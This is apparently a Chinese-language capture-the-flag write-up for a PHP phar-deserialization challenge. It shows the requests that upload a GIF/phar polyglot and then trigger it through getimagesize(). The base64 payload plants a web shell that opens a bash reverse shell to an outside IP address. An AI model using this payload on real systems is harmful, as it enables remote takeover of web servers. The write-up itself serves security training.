#GhostGIF
這題只能上傳 gif ，且題目說要反序列化，反序列化在 `getimagesize($name)`
在 php 中參數給 phar:// ，會把檔案當成 phar 文件並反序列化 metadata
先透過 create.php 建立 phar 檔案，其中要把 phar readonly 關掉
`/etc/php/7.2/cli/php.ini` 中把 `;phar.readonly = On` 改成 `;phar.readonly = Off`
`cat phar.phar | base64 -w 0` 去拿到 base64
然後上傳
```
https://edu-ctf.csie.org:10164//?action[]=upload
post:
c=R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrpAAAAAQAAABEAAAABAAAAAACzAAAATzoxMToiRmlsZU1hbmFnZXIiOjM6e3M6NDoibW9kZSI7czo2OiJ1cGxvYWQiO3M6NDoibmFtZSI7czozMDoiL3Zhci93d3cvaHRtbC91cGxvYWRzL3l1YW4ucGhwIjtzOjc6ImNvbnRlbnQiO3M6NjE6Ijw/cGhwIHN5c3RlbSgiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNDAuMTEzLjIwOS4yOC81NTY2IDA+JjEiKTsiO30IAAAAdGVzdC50eHQEAAAAE9cBXgQAAAAMfn/YpAEAAAAAAAB0ZXN0VQ7QXPTxxBq/2Xhvwdnkm0X0bI0CAAAAR0JNQg==
```
然後會拿到圖片的名稱去 getimagesize
```
https://edu-ctf.csie.org:10164/?action[]=getsize
post:
f=phar:///var/www/html/uploads/4028582915e01d7461e4675.60816068.gif
```
成功會 call __destruct() 並把 webshell 寫入
之後就能 rce 了
```
/uploads/yuan.php
```
